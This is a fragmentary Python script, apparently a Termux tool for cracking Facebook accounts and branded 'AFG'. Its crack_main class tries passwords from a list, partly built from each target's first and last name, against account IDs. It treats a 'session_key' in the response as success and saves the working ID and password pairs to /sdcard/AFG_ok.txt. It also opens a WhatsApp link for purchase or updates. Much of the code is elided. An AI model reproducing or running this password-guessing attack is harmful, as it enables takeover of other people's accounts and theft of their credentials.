...
def qsbuy():
        try:
                ...
                if str("upppdate") in update:
                        ...
                        os.system(f"termux-open-url https://wa.me/+923139974897?text={bumper}")
                        qsbuy()
...
def main():
        ...
        if menu_opt =='1':
                ...
                xchker()
                os.system('xdg-open https://github.com/AFG_Clonern ')
                main()
        elif menu_opt =='4':
...
class crack_main():
        ...
        def m1(self,iid,name,passlist):
                try:
                        ...
                        sys.stdout.write('\r[AFG] %s / [OK-%s] \r'%(loop,len(ok)));sys.stdout.flush()
                        fn = name.split(' ')[0]
                        try:
                                ln = name.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                                ...
                                if 'session_key' in po:
                                        print(' \033[1;32m[AFG-OK] '+roid+' | '+pas+'\033[0;97m')
                                        open('/sdcard/AFG_ok.txt','a').write(roid+'|'+pas+'\n')
                                        ok.append(iid)
                                        break
        ...
        def pasw(self):
                ...
                print(' Ok Ids Save In : /sdcard/AFG_ok.txt')
                print(50*'-')
                input('\n Press enter to back ')
                main()
